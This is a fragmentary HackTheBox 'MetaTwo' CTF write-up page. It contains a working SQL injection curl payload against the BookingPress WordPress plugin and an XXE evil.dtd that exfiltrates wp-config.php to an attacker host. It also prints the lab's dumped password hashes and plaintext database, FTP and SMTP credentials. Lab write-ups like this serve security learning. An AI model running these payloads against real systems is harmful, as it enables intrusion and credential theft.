@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>metatwo · the-grizzly-bear</title>
+<meta name="description" content="metatwo — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/metatwo.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
+<h1 id="title">metatwo</h1>
+
+<p class="figure"><a class="img-link" href="metatwo/untitled.png"><img src="metatwo/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-1.png"><img src="metatwo/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-2.png"><img src="metatwo/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" rel="noopener">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-3.png"><img src="metatwo/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-4.png"><img src="metatwo/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<ol><li>curl $baseurl'/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&amp;_wpnonce=$nonce&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT user_login,user_pass,1,1,2,3,4,5,6 FROM wp_users LIMIT 1 OFFSET $i-- -"</li></ol>
+<p>HTTP/1.1 200 OK<br>
+Server: nginx/1.18.0<br>
+Date: Thu, 01 Dec 2022 02:05:52 GMT<br>
+Content-Type: text/html; charset=UTF-8<br>
+Connection: close<br>
+X-Powered-By: PHP/8.0.24<br>
+X-Robots-Tag: noindex<br>
+X-Content-Type-Options: nosniff<br>
+Expires: Wed, 11 Jan 1984 05:00:00 GMT<br>
+Cache-Control: no-cache, must-revalidate, max-age=0<br>
+X-Frame-Options: SAMEORIGIN<br>
+Referrer-Policy: strict-origin-when-cross-origin<br>
+Content-Length: 1040</p>
+<p><a href="http://p%24bgrgrgf2wtobs79i07rk9sn4fzk.tv/" target="_blank" rel="noopener">{"bookingpress_service_id":"admin","bookingpress_category_id":"$[P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV</a>.","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"manager","bookingpress_category_id":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-5.png"><img src="metatwo/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p>action=bookingpress_front_get_category_services&amp;_wpnonce=8c57e8f795&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT user_login,user_pass,1,1,2,3,4,5,6 FROM wp_users-- -</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-6.png"><img src="metatwo/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p>manger</p>
+<p>partylikearockstar</p>
+<p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5" target="_blank" rel="noopener">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a></p>
+<p><a href="https://github.com/motikan2010/CVE-2021-29447" target="_blank" rel="noopener">https://github.com/motikan2010/CVE-2021-29447</a></p>
+<p><strong>Unicode Hex Character Code &amp;#x25; for %</strong></p>
+<p>$  cat evil.dtd<br>
+&lt;!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php"&gt;<br>
+&lt;!ENTITY % init "&lt;!ENTITY % trick SYSTEM '<a href="http://10.10.16.10:8001/?%data;%27" target="_blank" rel="noopener">http://10.10.16.10:8001/?�ta;'</a>&gt;"&gt;</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-7.png"><img src="metatwo/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-8.png"><img src="metatwo/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>/?jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-9.png"><img src="metatwo/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p>removed zlib defalte</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-10.png"><img src="metatwo/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p>echo 'PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==' | base64 -d<br>
+&lt;?php<br>
+/** The name of the database for WordPress */<br>
+define( 'DB_NAME', 'blog' );</p>
+<p>/** MySQL database username */<br>
+define( 'DB_USER', 'blog' );</p>
+<p>/** MySQL database password */<br>
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );</p>
+<p>/** MySQL hostname */<br>
+define( 'DB_HOST', 'localhost' );</p>
+<p>/** Database Charset to use in creating database tables. */<br>
+define( 'DB_CHARSET', 'utf8mb4' );</p>
+<p>/** The Database Collate type. Don't change this if in doubt. */<br>
+define( 'DB_COLLATE', '' );</p>
+<p>define( 'FS_METHOD', 'ftpext' );<br>
+define( 'FTP_USER', 'metapress.htb' );<br>
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );<br>
+define( 'FTP_HOST', 'ftp.metapress.htb' );<br>
+define( 'FTP_BASE', 'blog/' );<br>
+define( 'FTP_SSL', false );</p>
+<p>/**#@+</p>
+<ul><li>Authentication Unique Keys and Salts.</li><li>@since 2.6.0<br>*/<br>define( 'AUTH_KEY', '?!Z$uGO*A6xOE5x,pweP4i*z;m<code>|.Z:X@)QRQFXkCRyl7}</code>rXVG=3 n&gt;+3m?.B/:' );<br>define( 'SECURE_AUTH_KEY', 'x$i$)b0]b1cup;47<code>YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' ); define( 'LOGGED_IN_KEY', 'J+mxCaP4z&lt;g.6P^t</code>ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );<br>define( 'NONCE_KEY', 'SmeDr$$O0ji;^9]<em><code>~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' ); define( 'AUTH_SALT', '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=</code>l@v$-vH</em>&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );<br>define( 'SECURE_AUTH_SALT', '&gt;<code>VAs6!G955dJs?$O4zm</code>.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );<br>define( 'LOGGED_IN_SALT', '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );<br>define( 'NONCE_SALT', '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );</li></ul>
+<p>/**</p>
+<ul><li>WordPress Database Table prefix.<br>*/<br>$table_prefix = 'wp_';</li></ul>
+<p>/**</p>
+<ul><li>For developers: WordPress debugging mode.</li><li>@link <a href="https://wordpress.org/support/article/debugging-in-wordpress/" target="_blank" rel="noopener">https://wordpress.org/support/article/debugging-in-wordpress/</a><br>*/<br>define( 'WP_DEBUG', false );</li></ul>
+<p>/** Absolute path to the WordPress directory. */<br>
+if ( ! defined( 'ABSPATH' ) ) {<br>
+define( 'ABSPATH', <strong>DIR</strong> . '/' );<br>
+}</p>
+<p>/** Sets up WordPress vars and included files. */<br>
+require_once ABSPATH . 'wp-settings.php';</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-11.png"><img src="metatwo/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-12.png"><img src="metatwo/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-13.png"><img src="metatwo/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p>cat send_email.php<br>
+&lt;?php<br>
+/*</p>
+<ul><li>This script will be used to send an email to all our users when ready for launch<br>*/</li></ul>
+<p>use PHPMailer\PHPMailer\PHPMailer;<br>
+use PHPMailer\PHPMailer\SMTP;<br>
+use PHPMailer\PHPMailer\Exception;</p>
+<p>require 'PHPMailer/src/Exception.php';<br>
+require 'PHPMailer/src/PHPMailer.php';<br>
+require 'PHPMailer/src/SMTP.php';</p>
+<p>$mail = new PHPMailer(true);</p>
+<p>$mail-&gt;SMTPDebug = 3;<br>
+$mail-&gt;isSMTP();</p>
+<p>$mail-&gt;Host = "mail.metapress.htb";<br>
+$mail-&gt;SMTPAuth = true;<br>
+$mail-&gt;Username = "jnelson@metapress.htb";<br>
+$mail-&gt;Password = "Cb4_JmWM8zUZWMu@Ys";<br>
+$mail-&gt;SMTPSecure = "tls";<br>
+$mail-&gt;Port = 587;</p>
+<p>$mail-&gt;From = "jnelson@metapress.htb";<br>
+$mail-&gt;FromName = "James Nelson";</p>
+<p>$mail-&gt;addAddress("info@metapress.htb");</p>
+<p>$mail-&gt;isHTML(true);</p>
+<p>$mail-&gt;Subject = "Startup";<br>
+$mail-&gt;Body = "&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;";</p>
+<p>try {<br>
+$mail-&gt;send();<br>
+echo "Message has been sent successfully";<br>
+} catch (Exception $e) {<br>
+echo "Mailer Error: " . $mail-&gt;ErrorInfo;<br>
+}</p>
+<p>Cb4_JmWM8zUZWMu@Ys</p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-14.png"><img src="metatwo/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-15.png"><img src="metatwo/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-16.png"><img src="metatwo/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-17.png"><img src="metatwo/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-18.png"><img src="metatwo/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-19.png"><img src="metatwo/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-20.png"><img src="metatwo/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-21.png"><img src="metatwo/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="metatwo/untitled-22.png"><img src="metatwo/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p>b66bdca9ea5e37bcab6c6049c8a8221e</p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
